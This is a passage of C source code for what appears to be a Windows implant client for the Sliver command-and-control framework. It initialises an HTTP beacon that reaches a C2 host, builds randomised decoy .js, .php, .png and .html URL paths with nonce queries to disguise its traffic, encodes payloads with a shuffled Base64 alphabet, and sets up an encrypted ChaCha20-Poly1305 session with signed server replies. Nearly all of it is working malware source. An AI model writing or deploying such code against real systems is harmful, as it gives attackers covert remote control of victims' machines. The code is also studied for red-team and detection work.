	pResult->lpPeerPrivKey = DuplicateStrA(szPeerPrivKey, 0);
	pResult->HttpConfig.lpUserAgent = DuplicateStrA(szUserAgent, 0);
	pTemp = GenRandomBytes(8);
	memcpy(&pResult->uPeerID, pTemp, 8);
	lpProxy = GetProxyConfig();
	if (lpProxy != NULL) {
		if (!lstrcmpA(lpProxy, "auto")) {
			pResult->HttpConfig.pProxyConfig = ProxyInit(UseAutoDiscovery, NULL);
		}
		else {
			pResult->HttpConfig.pProxyConfig = ProxyInit(UserProvided, lpProxy);
		}
	}

	pResult->HttpConfig.dwNumberOfAttemps = 10;
	pResult->cbPollPaths = _countof(PollPaths);
	for (i = 0; i < _countof(PollPaths); i++) {
		pResult->PollPaths[i] = DuplicateStrA(PollPaths[i], 0);
	}

	pResult->cbPollFiles = _countof(PollFiles);
	for (i = 0; i < _countof(PollFiles); i++) {
		pResult->PollFiles[i] = DuplicateStrA(PollFiles[i], 0);
	}

	pResult->cbSessionFiles = _countof(SessionFiles);
	for (i = 0; i < _countof(SessionFiles); i++) {
		pResult->SessionFiles[i] = DuplicateStrA(SessionFiles[i], 0);
	}

	pResult->cbSessionPaths = _countof(SessionPaths);
	for (i = 0; i < _countof(SessionPaths); i++) {
		pResult->SessionPaths[i] = DuplicateStrA(SessionPaths[i], 0);
	}

	pResult->cbCloseFiles = _countof(CloseFiles);
	for (i = 0; i < _countof(CloseFiles); i++) {
		pResult->CloseFiles[i] = DuplicateStrA(CloseFiles[i], 0);
	}

	pResult->cbClosePaths = _countof(ClosePaths);
	for (i = 0; i < _countof(ClosePaths); i++) {
		pResult->ClosePaths[i] = DuplicateStrA(ClosePaths[i], 0);
	}

	pResult->dwMinNumOfSegments = 2;
	pResult->dwMaxNumOfSegments = 4;
	pResult->uEncoderNonce = uEncoderNonce;
	pResult->dwPollInterval = 3;
	pResult->UseStandardPort = TRUE;
	pResult->lpHostName = DuplicateStrA(lpC2Url, 0);
	pResult->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
	pResult->uReconnectInterval = 60000000000;
	IsOk = TRUE;
CLEANUP:
	if (pTemp != NULL) {
		FREE(pTemp);
	}

	if (lpProxy != NULL) {
		FREE(lpProxy);
	}

	if (lpEncodedSessionKey != NULL) {
		FREE(lpEncodedSessionKey);
	}

	if (!IsOk && pResult != NULL) {
		FreeHttpClient(pResult);
	}

	return pResult;
}

LPSTR JoinUrlPath
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ LPSTR* pSegments,
	_In_ DWORD cbSegment
)
{
	LPSTR lpResult = NULL;
	DWORD cbResult = 0;
	DWORD dwPos = 0;
	DWORD cbPathPrefix = 0;
	DWORD i = 0;

	cbResult = 0x100;
	lpResult = ALLOC(cbResult + 1);
	if (pClient->lpPathPrefix != NULL && StrCmpA(pClient->lpPathPrefix, "/")) {
		cbPathPrefix = lstrlenA(pClient->lpPathPrefix);
		if (cbPathPrefix > cbResult) {
			cbResult = cbPathPrefix * 2;
			lpResult = REALLOC(lpResult, cbResult + 1);
		}

		lstrcpyA(&lpResult[dwPos], pClient->lpPathPrefix);
		dwPos += cbPathPrefix;
		lstrcatA(&lpResult[dwPos++], "/");
	}

	for (i = 0; i < cbSegment; i++) {
		if (dwPos > cbResult) {
			cbResult *= 2;
			lpResult = REALLOC(lpResult, cbResult + 1);
		}

		lstrcatA(&lpResult[dwPos], pSegments[i]);
		dwPos += lstrlenA(pSegments[i]);
		if (i < cbSegment - 1) {
			lstrcatA(&lpResult[dwPos++], "/");
		}
	}

	return lpResult;
}

LPSTR* RandomUrlPath
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ LPSTR* pSegments,
	_In_ DWORD cbSegments,
	_In_ LPSTR* pFileNames,
	_In_ DWORD cbFileNames,
	_In_ LPSTR lpExtension,
	_Out_ PDWORD pcbResult
)
{
	DWORD dwNumOfSegments = 0;
	DWORD i = 0;
	LPSTR* lpResult = NULL;
	DWORD cbResult = 0;
	LPSTR lpFileName = NULL;
	DWORD cbFileName = 0;

	lpResult = ALLOC((pClient->dwMaxNumOfSegments + 1) * sizeof(LPSTR));
	if (cbSegments > 0) {
		dwNumOfSegments = GenRandomNumber32(pClient->dwMinNumOfSegments, pClient->dwMaxNumOfSegments);
		for (i = 0; i < dwNumOfSegments; i++) {
			lpResult[cbResult++] = DuplicateStrA(pSegments[GenRandomNumber32(0, cbSegments)], 0);
		}
	}

	lpResult = REALLOC(lpResult, (cbResult + 1) * sizeof(LPSTR));
	lpFileName = DuplicateStrA(pFileNames[GenRandomNumber32(0, cbFileNames)], lstrlenA(lpExtension) + 1);
	lstrcatA(lpFileName, ".");
	lstrcatA(lpFileName, lpExtension);
	lpResult[cbResult++] = lpFileName;
	if (pcbResult != NULL) {
		*pcbResult = cbResult;
	}

	return lpResult;
}

LPSTR ParseSegmentsUrl
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ SegmentType SegmentType
)
{
	DWORD dwNumOfSegments = 0;
	LPSTR* pSegments = NULL;
	DWORD i = 0;
	LPSTR lpResult = NULL;

	if (SegmentType == PollType) {
		pSegments = RandomUrlPath(pClient, pClient->PollPaths, pClient->cbPollPaths, pClient->PollFiles, pClient->cbPollFiles, "js", &dwNumOfSegments);
	}
	else if (SegmentType == SessionType) {
		pSegments = RandomUrlPath(pClient, pClient->SessionPaths, pClient->cbSessionPaths, pClient->SessionFiles, pClient->cbSessionFiles, "php", &dwNumOfSegments);
	}
	else if (SegmentType == CloseType) {
		pSegments = RandomUrlPath(pClient, pClient->ClosePaths, pClient->cbClosePaths, pClient->CloseFiles, pClient->cbCloseFiles, "png", &dwNumOfSegments);
	}
	else {
		goto CLEANUP;
	}

	lpResult = JoinUrlPath(pClient, pSegments, dwNumOfSegments);
CLEANUP:
	if (pSegments != NULL) {
		for (i = 0; i < dwNumOfSegments; i++) {
			FREE(pSegments[i]);
		}

		FREE(pSegments);
	}

	return lpResult;
}

LPSTR GenNonceQuery
(
	_In_ UINT64 uNonceID
)
{
	CHAR szNonceQueryArgChars[] = "abcdefghijklmnopqrstuvwxyz";
	DWORD i = 0;
	LPSTR lpResult = NULL;
	DWORD dwRandIdx = 0;
	LPSTR lpTemp = NULL;
	UINT64 uNonce = 0;

	uNonce = (((UINT64)GenRandomNumber32(0, 9999999)) * 65537) + uNonceID;
	lpResult = ALLOC(100);
	sprintf_s(lpResult, 100, "%lld", uNonce);
	for (i = 0; i < 3; i++) {
		lpTemp = lpResult;
		dwRandIdx = GenRandomNumber32(0, lstrlenA(lpTemp));
		lpResult = StrInsertCharA(lpResult, szNonceQueryArgChars[GenRandomNumber32(0, lstrlenA(szNonceQueryArgChars))], dwRandIdx);
		FREE(lpTemp);
	}

	return lpResult;
 }

LPSTR CreatePollURL
(
	_In_ PSLIVER_HTTP_CLIENT pClient
)
{
	LPSTR lpUrlPath = NULL;
	LPSTR lpResult = NULL;
	LPSTR lpNonce = NULL;

	lpUrlPath = ParseSegmentsUrl(pClient, PollType);
	lpResult = DuplicateStrA(pClient->lpHostName, lstrlenA(lpUrlPath) + 100);
	lstrcatA(lpResult, "/");
	lstrcatA(lpResult, lpUrlPath);
	lstrcatA(lpResult, "?x=");
	lpNonce = GenNonceQuery(pClient->uEncoderNonce);
	lstrcatA(lpResult, lpNonce);
CLEANUP:
	if (lpNonce != NULL) {
		FREE(lpNonce);
	}

	if (lpUrlPath != NULL) {
		FREE(lpUrlPath);
	}

	return lpResult;
}

LPSTR CreateSessionURL
(
	_In_ PSLIVER_HTTP_CLIENT pClient
)
{
	LPSTR lpUrlPath = NULL;
	LPSTR lpResult = NULL;
	LPSTR lpNonce = NULL;

	lpUrlPath = ParseSegmentsUrl(pClient, SessionType);
	lpResult = DuplicateStrA(pClient->lpHostName, lstrlenA(lpUrlPath) + 100);
	lstrcatA(lpResult, "/");
	lstrcatA(lpResult, lpUrlPath);
	lstrcatA(lpResult, "?x=");
	lpNonce = GenNonceQuery(pClient->uEncoderNonce);
	lstrcatA(lpResult, lpNonce);
CLEANUP:
	if (lpNonce != NULL) {
		FREE(lpNonce);
	}

	if (lpUrlPath != NULL) {
		FREE(lpUrlPath);
	}

	return lpResult;
}

LPSTR StartSessionURL
(
	_In_ PSLIVER_HTTP_CLIENT pClient
)
{
	LPSTR lpUrlPath = NULL;
	LPSTR lpTemp = NULL;
	LPSTR lpResult = NULL;
	LPSTR lpNonce = NULL;

	lpUrlPath = ParseSegmentsUrl(pClient, SessionType);
	lpTemp = TrimSuffixA(lpUrlPath, "php", FALSE);
	FREE(lpUrlPath);
	lpUrlPath = lpTemp;
	lpUrlPath = REALLOC(lpUrlPath, lstrlenA(lpUrlPath) + 5);
	lstrcatA(lpUrlPath, "html");
	lpResult = DuplicateStrA(pClient->lpHostName, lstrlenA(lpUrlPath) + 100);
	lstrcatA(lpResult, "/");
	lstrcatA(lpResult, lpUrlPath);
	lstrcatA(lpResult, "?t=");
	lpNonce = GenNonceQuery(pClient->uEncoderNonce);
	lstrcatA(lpResult, lpNonce);
CLEANUP:
	if (lpNonce != NULL) {
		FREE(lpNonce);
	}

	if (lpUrlPath != NULL) {
		FREE(lpUrlPath);
	}

	return lpResult;
}

PBYTE SliverBase64Decode
(
	_In_ LPSTR lpInput,
	_Out_ PDWORD pcbOutput
)
{
	CHAR szOldCharSet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	CHAR szNewCharSet[] = "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ";
	LPSTR lpTemp = NULL;
	DWORD cbInput = lstrlenA(lpInput);
	DWORD i = 0;
	lpTemp = ALLOC(cbInput + 1);
	DWORD dwPos = 0;
	PBYTE pResult = NULL;

	for (i = 0; i < cbInput; i++) {
		dwPos = StrChrA(szNewCharSet, lpInput[i]) - szNewCharSet;
		lpTemp[i] = szOldCharSet[dwPos];
	}

	pResult = Base64Decode(lpTemp, pcbOutput);
	FREE(lpTemp);
	return pResult;
}

LPSTR SliverBase64Encode
(
	_In_ PBYTE lpInput,
	_In_ DWORD cbInput
)
{
	LPSTR lpResult = NULL;
	DWORD cbResult = 0;
	CHAR szOldCharSet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	CHAR szNewCharSet[] = "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ";
	DWORD i = 0;
	DWORD dwPos = 0;

	lpResult = Base64Encode(lpInput, cbInput, TRUE);
	cbResult = lstrlenA(lpResult);
	for (i = 0; i < cbResult; i++) {
		dwPos = StrChrA(szOldCharSet, lpResult[i]) - szOldCharSet;
		lpResult[i] = szNewCharSet[dwPos];
	}

	return lpResult;
}

PMINISIGN_PUB_KEY DecodeMinisignPublicKey
(
	_In_ LPSTR lpInput
)
{
	PMINISIGN_PUB_KEY pResult = NULL;
	LPSTR* pSplittedArray = NULL;
	DWORD cbSplittedArray = 0;
	PBYTE pTemp = NULL;
	DWORD cbTemp = NULL;
	DWORD i = 0;

	pSplittedArray = StrSplitNA(lpInput, "\n", 0, &cbSplittedArray);
	if (pSplittedArray == NULL || cbSplittedArray == 0) {
		goto CLEANUP;
	}

	pTemp = Base64Decode(pSplittedArray[1], &cbTemp);
	if (cbTemp != sizeof(MINISIGN_PUB_KEY)) {
		FREE(pTemp);
		goto CLEANUP;
	}

	pResult = (PMINISIGN_PUB_KEY)pTemp;
CLEANUP:
	if (pSplittedArray != NULL) {
		for (i = 0; i < cbSplittedArray; i++) {
			if (pSplittedArray[i] != NULL) {
				FREE(pSplittedArray[i]);
			}
		}

		FREE(pSplittedArray);
	}
	
	return pResult;
}

BOOL VerifySign
(
	_In_ PMINISIGN_PUB_KEY pPubKey,
	_In_ PBYTE pMessage,
	_In_ DWORD cbMessage,
	_In_ BOOL IsHashed
)
{
	UINT16 Algorithm;
	BYTE KeyID[8];
	BYTE Signature[ED25519_SIGNATURE_SIZE];
	BOOL Result = FALSE;
	PBYTE HashBuffer = NULL;
	PBYTE pBuffer = NULL;
	DWORD cbBuffer = 0;

	memcpy(&Algorithm, pMessage, sizeof(Algorithm));
	memcpy(KeyID, pMessage + sizeof(Algorithm), sizeof(KeyID));
	memcpy(Signature, pMessage + sizeof(Algorithm) + sizeof(KeyID), sizeof(Signature));
	if (memcmp(KeyID, pPubKey->KeyId, sizeof(KeyID))) {
		LogError(L"memcmp failed at %lls.\n", __FUNCTIONW__);
		goto CLEANUP;
	}

	pBuffer = pMessage + sizeof(Algorithm) + sizeof(KeyID) + sizeof(Signature);
	cbBuffer = cbMessage - sizeof(Algorithm) - sizeof(KeyID) - sizeof(Signature);
	if (pPubKey->SignatureAlgorithm == HASH_EDDSA && !IsHashed) {
		HashBuffer = Blake2B(pMessage, cbMessage, NULL, 0);
		pBuffer = HashBuffer;
		cbBuffer = BLAKE2B_OUTBYTES;
	}

	Result = ED25519Verify(Signature, pBuffer, cbBuffer, pPubKey->PublicKey);
CLEANUP:
	if (HashBuffer != NULL) {
		FREE(HashBuffer);
	}

	return Result;
}

PBYTE SessionDecrypt
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ PBYTE pMessage,
	_In_ DWORD cbMessage,
	_Out_ PDWORD pcbPlainText
)
{
	PBYTE pResult = NULL;
	PMINISIGN_PUB_KEY pDecodedPubKey = NULL;
	PBYTE pCipherText = NULL;
	PBYTE pNonce = NULL;
	DWORD cbCipherText = 0;
	DWORD cbPlainText = 0;

	if (cbMessage < MINISIGN_SIZE + 1) {
		goto CLEANUP;
	}

	pDecodedPubKey = DecodeMinisignPublicKey(pClient->lpServerMinisignPublicKey);
	if (pDecodedPubKey == NULL) {
		goto CLEANUP;
	}

	if (!VerifySign(pDecodedPubKey, pMessage, cbMessage, FALSE)) {
		goto CLEANUP;
	}

	pNonce = pMessage + MINISIGN_SIZE;
	pCipherText = pNonce + CHACHA20_NONCE_SIZE;
	cbCipherText = cbMessage - MINISIGN_SIZE - CHACHA20_NONCE_SIZE;
	pResult = ALLOC(cbCipherText);
	pResult = Chacha20Poly1305DecryptAndVerify(pClient->pSessionKey, pNonce, pCipherText, cbCipherText, NULL, 0, &cbPlainText);
	if (pResult == NULL || cbPlainText == 0) {
		goto CLEANUP;
	}

	if (pcbPlainText != NULL) {
		*pcbPlainText = cbPlainText;
	}

CLEANUP:
	if (pDecodedPubKey != NULL) {
		FREE(pDecodedPubKey);
	}

	return pResult;
}

PBYTE SessionEncrypt
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ PBYTE pMessage,
	_In_ DWORD cbMessage,
	_Out_ PDWORD pcbCipherText
)
{
	PBYTE pNonce = NULL;
	PBYTE pResult = NULL;

	pNonce = GenRandomBytes(CHACHA20_NONCE_SIZE);
	Chacha20Poly1305Encrypt(pClient->pSessionKey, pNonce, pMessage, cbMessage, NULL, 0, &pResult, pcbCipherText);
	if (pNonce != NULL) {
		FREE(pNonce);
	}

	return pResult;
}

PSLIVER_HTTP_CLIENT SliverSessionInit
(
	_In_ LPSTR lpC2Url
)
{
	LPSTR lpFullUri = NULL;
	PURI pUri = NULL;
	DWORD cbResp = 0;
	PSLIVER_HTTP_CLIENT pSliverClient = NULL;
	LPSTR lpEncodedSessionKey = NULL;
	BOOL bIsOk = FALSE;
	PHTTP_RESP pResp = NULL;
	PBYTE pDecodedResp = NULL;
	DWORD cbDecodedResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PWEB_PROXY pProxyConfig = NULL;
	LPSTR lpSessionId = NULL;
	DWORD cbSessionId = 0;
	PBYTE pEncryptedSessionInit = NULL;
	LPSTR lpRespData = NULL;
	DWORD cbEncryptedSessionInit = 0;
	PBYTE pMarshalledData = NULL;

	pSliverClient = SliverHttpClientInit(lpC2Url);
	if (pSliverClient == NULL) {
		goto CLEANUP;
	}

	lpFullUri = StartSessionURL(pSliverClient);
	if (lpFullUri == NULL) {
		goto CLEANUP;
	}

	pUri = UriInit(lpFullUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pSliverClient->pHttpClient = HttpClientInit(pUri, pSliverClient->HttpConfig.pProxyConfig);
	if (pSliverClient->pHttpClient == NULL) {
		goto CLEANUP;
	}

	pMarshalledData = ALLOC(CHACHA20_KEY_SIZE + 2);
	pMarshalledData[0] = 10;
	pMarshalledData[1] = CHACHA20_KEY_SIZE;
	memcpy(pMarshalledData + 2, pSliverClient->pSessionKey, CHACHA20_KEY_SIZE);
	pEncryptedSessionInit = AgeKeyExToServer(pSliverClient->lpRecipientPubKey, pSliverClient->lpPeerPrivKey, pSliverClient->lpPeerPubKey, pMarshalledData, CHACHA20_KEY_SIZE + 2, &cbEncryptedSessionInit);
	if (pEncryptedSessionInit == NULL || cbEncryptedSessionInit == 0) {
		goto CLEANUP;
	}

	lpEncodedSessionKey = SliverBase64Encode(pEncryptedSessionInit, cbEncryptedSessionInit);
	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, NULL, POST, NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	lpRespData = ExtractSubStrA(pResp->pRespData, pResp->cbResp);
	pDecodedResp = SliverBase64Decode(lpRespData, &cbDecodedResp);
	if (pDecodedResp == NULL || cbDecodedResp == 0) {
		goto CLEANUP;
	}

	lpSessionId = SessionDecrypt(pSliverClient, pDecodedResp, cbDecodedResp, &cbSessionId);
	if (lpSessionId == NULL || cbSessionId == 0) {
		goto CLEANUP;
	}

	memcpy(pSliverClient->szSessionID, lpSessionId, cbSessionId);
	bIsOk = TRUE;
CLEANUP:
	if (!bIsOk) {
		FreeSliverHttpClient(pSliverClient);
		pSliverClient = NULL;
	}

	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	if (lpSessionId != NULL) {
		FREE(lpSessionId);
	}

	if (lpEncodedSessionKey != NULL) {
		FREE(lpEncodedSessionKey);
	}

	if (lpFullUri != NULL) {
		FREE(lpFullUri);
	}

	if (pMarshalledData != NULL) {
		FREE(pMarshalledData);
	}

	if (pEncryptedSessionInit != NULL) {
		FREE(pEncryptedSessionInit);
	}

	FreeHttpResp(pResp);
	return pSliverClient;
}